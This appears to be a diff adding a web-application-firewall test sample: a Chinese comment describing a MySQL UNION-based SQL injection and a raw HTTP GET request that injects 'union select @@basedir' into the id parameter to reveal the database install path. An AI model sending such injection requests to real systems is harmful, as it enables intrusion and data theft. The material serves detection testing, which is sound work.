@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506207
+# 攻击者基于UNION查询，将"union select @@basedir"语句注入到 SQL 查询参数中，利用@@basedir这个内置函数获取当前数据库安装路径。通过了解当前数据库安装路径的信息，从而进一步对数据库进行恶意操作，比如篡改用户信息、窃取敏感数据等。
+GET /?id=1%20union%20select%20@@basedir&bid=hd_tag_m8mv24gg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24gg
+RM-PRO-Token: 7d0e7bf18056a0c3a8c14dbb2d664ebf
+RM-PRO-Time: 1742808381284
+User-Agent: curl/7.83.1
+
